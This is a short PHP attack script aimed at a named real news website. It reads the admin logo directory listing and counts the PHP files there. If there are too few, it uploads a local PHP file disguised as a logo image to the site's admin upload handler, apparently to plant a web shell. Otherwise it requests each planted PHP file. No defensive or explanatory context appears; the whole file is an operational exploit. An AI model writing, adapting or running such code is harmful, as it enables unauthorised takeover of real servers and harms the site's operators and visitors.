<?php


use simplehtmldom\HtmlDocument;
require 'vendor/autoload.php';
include './includes/core.php';


$httpClient = new \simplehtmldom\HtmlWeb();

$response = file_get_contents('https://www.ukrzmi.com/admin/components/logos/');
$f_href = (new HtmlDocument())->load($response)->find('tr');
 $mon = 0;
 $files = [];
foreach($f_href as $row){
    $data = $row->first_child ()->{'data-sort'};
    if(strlen($data > 1)){
        $ext = str_replace(" ","",strstr($data, '.'));
       
        if($ext == '.php'){
            array_push($files, $data);
            echo $data.'<br/>';
            $mon += 1;
        }else{
            echo $ext.'<br/>';
        }
        

    }
   
}

if($mon < 5){
    echo 'no php file<br/>';
    //upload
    $fname = './tkinter_write.php';
 

      $data = [ 
        "logo" => "1", 
        "name" => "test", 
        "width" => "20", 
        "height" => "20", 
        "filesize" => "20", 
        "source" => "20", 
        "type" => "20", 
        "image"=>curl_file_create($fname,'application/x-httpd-php','001.php') 
    ];

    $url = 'https://www.ukrzmi.com/admin/library/logo_view_process.php';

     httpUpload($url, $data);

}else{
    echo $mon.' files found<br/>';
    foreach($files as $row){
        $url = 'https://www.ukrzmi.com/admin/components/logos/'.$row;
        echo httpGet($url, []).'<br/><br/>';
    }
}

echo json_encode($files);

///////////////////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////

?>